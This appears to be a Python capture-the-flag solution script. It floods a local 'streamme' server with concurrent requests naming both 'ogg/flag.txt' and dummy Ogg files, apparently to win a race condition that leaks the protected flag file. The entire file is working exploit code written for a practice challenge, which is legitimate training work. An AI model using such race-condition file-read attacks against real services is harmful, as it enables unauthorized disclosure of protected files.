import socket
import sys
import os
import re
import time
import threading
import signal

flagFoundCondition = threading.Condition()
oneThreadTerminatedLock = threading.Lock()
oneThreadTerminated = False
serverPid = 0

def createFile(number):
	filename = 'ogg/'+ str(number) +'.ogg'
	with(open(filename, 'w+')) as f:
		f.write('Ogg')
		f.seek(number * 1024 - 1)
		f.write("\0")
	return filename

filename128 = createFile(128)
#global filename256 = createFile(256)
#global filename512 = createFile(512)
#global filename1024 = createFile(1024)
#global filename2048 = createFile(2048)
filename4196 = createFile(4196)

def startServer():
	global serverPid
	if serverPid != 0:
		try:
			os.kill(serverPid, signal.SIGTERM)
		except OSError:
			pass

	serverPid = os.fork()
	if serverPid == 0:
		print('start server')
		os.execv('./streamme', ['streamme'])

def connectToServer():
	print('connecting to server')
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect(('127.0.0.1', 1337))
	return sock



def checkForFlag(data):
	reg = re.compile("IIS{.*}")
#	reg = re.compile("fool")
	result = reg.search(unicode(data, 'utf-8'))
	if result:
		print(result.group(0))
		return True
	return False
	
def receive(sock):
	global flagFoundCondition
	global oneThreadTerminated
	global oneThreadTerminatedLock
	while not oneThreadTerminated:
		try:
			data = sock.recv(10000)
#			print(unicode(data, 'utf-8'))
			if(checkForFlag(data)):
				flagFoundCondition.acquire()
				flagFoundCondition.notify()
				flagFoundCondition.release()
				return checkForFlag(data)
		except Exception:
			oneThreadTerminatedLock.acquire()
			oneThreadTerminated = True
			oneThreadTerminatedLock.release()
	
def startReceiveThread(sock):
	print('start receive thread')
	thread = threading.Thread(target=receive, args=(sock, ))
	thread.setDaemon(True)
	thread.start()
	return thread

def send(sock):
	global oneThreadTerminated
	global oneThreadTerminatedLock
	global filename128
	global filename4196
	while not oneThreadTerminated:
		try:	
			time.sleep(0.1)
			sock.sendall(str.encode('ogg/flag.txt' + '\0'))
			sock.sendall(str.encode(filename128 + '\0'))
			sock.sendall(str.encode(filename4196 + '\0'))
		except Exception:
			oneThreadTerminatedLock.acquire()
			oneThreadTerminated = True
			oneThreadTerminatedLock.release()

def startSendThread(sock):	
	print('starting sending thread')
	thread = threading.Thread(target=send, args=(sock, ))
	thread.setDaemon(True)
	thread.start()
	return thread

def startAllThreadsThread():
	global oneThreadTerminated
	rounds = 0


	while True:
		oneThreadTerminated = False
		#startServer()
		time.sleep(1)
		sock = connectToServer()

		recThread1 = startReceiveThread(sock)
		recThread2 = startReceiveThread(sock)
		
		threads = []
		for i in range (100):
			thread = startSendThread(sock)
			threads.append(thread)
		print('done starting threads')
		#sendThread6 = startSendThread(sock, 'ogg/flag.txt')
		#sendThread1 = startSendThread(sock, filename128)
		#sendThread2 = startSendThread(sock, filename256)
		#sendThread6 = startSendThread(sock, 'ogg/flag.txt')
		#sendThread3 = startSendThread(sock, filename512)
		#sendThread4 = startSendThread(sock, filename1024)
		#sendThread5 = startSendThread(sock, filename2048)
		#sendThread6 = startSendThread(sock, 'ogg/flag.txt')

		for thread in threads:
			thread.join()
		#sendThread1.join()
		#sendThread2.join()
		#sendThread3.join()
		#sendThread4.join()
		#sendThread5.join()
		#sendThread6.join()
		recThread1.join()
		recThread2.join()

		sock.close()

		try:
			os.kill(serverPid, signal.SIGTERM)
		except OSError:
			pass

		os.waitpid(serverPid, 0)

		print('round: '+str(rounds)+'\n')
		rounds += 1

thread = threading.Thread(target=startAllThreadsThread, args=())
thread.setDaemon(True)
thread.start()


flagFoundCondition.acquire()
flagFoundCondition.wait()
flagFoundCondition.release()

print('got the flag')

try:
	os.kill(serverPid, signal.SIGTERM)
except OSError:
	pass

exit(0)

